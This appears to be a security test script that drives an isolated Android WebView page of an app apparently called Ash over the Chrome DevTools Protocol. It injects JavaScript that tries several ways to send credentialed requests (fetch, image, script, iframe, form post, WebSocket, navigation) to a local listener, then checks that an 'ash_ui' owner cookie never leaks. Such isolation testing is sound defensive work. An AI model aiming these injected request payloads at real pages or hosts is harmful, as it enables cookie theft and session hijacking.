// Isolated ai.ash.agent.probe only. Requires an explicit CDP forward and a
// wrong-port listener whose /report returns {requests,ashUi}; prints counts only.
import assert from "node:assert/strict";

const cdp = "http://127.0.0.1:9223";
const target = "http://127.0.0.1:14766";
const pages = await (await fetch(`${cdp}/json`)).json();
const page = pages.find((item) => item.url === "https://appassets.androidplatform.net/assets/ash-ui/index.html");
assert.ok(page, "isolated Ash asset page unavailable");
const ws = new WebSocket(page.webSocketDebuggerUrl);
const waiting = new Map();
let id = 0;
ws.onmessage = (event) => {
  const packet = JSON.parse(event.data);
  const pending = waiting.get(packet.id);
  if (pending) { waiting.delete(packet.id); pending(packet); }
};
await new Promise((resolve, reject) => { ws.onopen = resolve; ws.onerror = reject; });
function command(method, params = {}) {
  const number = ++id;
  return new Promise((resolve) => { waiting.set(number, resolve); ws.send(JSON.stringify({ id: number, method, params })); });
}
async function report() {
  const result = await (await fetch(`${target}/report`)).json();
  assert.equal(typeof result.requests, "number");
  assert.equal(typeof result.ashUi, "number");
  return result;
}
const attempts = [
  ["fetch-with-credentials", `fetch("${target}/fetch",{credentials:"include",mode:"no-cors"}).catch(()=>{})`],
  ["image", `(()=>{const n=document.createElement("img");n.src="${target}/image";document.body.append(n)})()`],
  ["script", `(()=>{const n=document.createElement("script");n.src="${target}/script";document.body.append(n)})()`],
  ["stylesheet", `(()=>{const n=document.createElement("link");n.rel="stylesheet";n.href="${target}/css";document.head.append(n)})()`],
  ["iframe", `(()=>{const n=document.createElement("iframe");n.src="${target}/iframe";document.body.append(n)})()`],
  ["form-post", `(()=>{const n=document.createElement("form");n.method="POST";n.action="${target}/post";document.body.append(n);n.submit()})()`],
  ["websocket", `(()=>{try{new WebSocket("ws://127.0.0.1:14766/socket")}catch{}})()`],
  ["location-get", `location.href="${target}/navigate"`],
];
const results = [];
try {
  const cookies = await command("Network.getCookies", { urls: ["http://127.0.0.1:14763/", `${target}/`] });
  assert.equal(cookies.result?.cookies?.some((cookie) => cookie.name === "ash_ui"), false);
  for (const [name, expression] of attempts) {
    await command("Runtime.evaluate", { expression, returnByValue: true });
    await new Promise((resolve) => setTimeout(resolve, 350));
    const counts = await report();
    assert.equal(counts.ashUi, 0, `${name} leaked an owner cookie`);
    results.push({ name, ...counts });
  }
  console.log(JSON.stringify({ isolatedPackage: "ai.ash.agent.probe", ashUiCookieStored: false, results }));
} finally { ws.close(); }
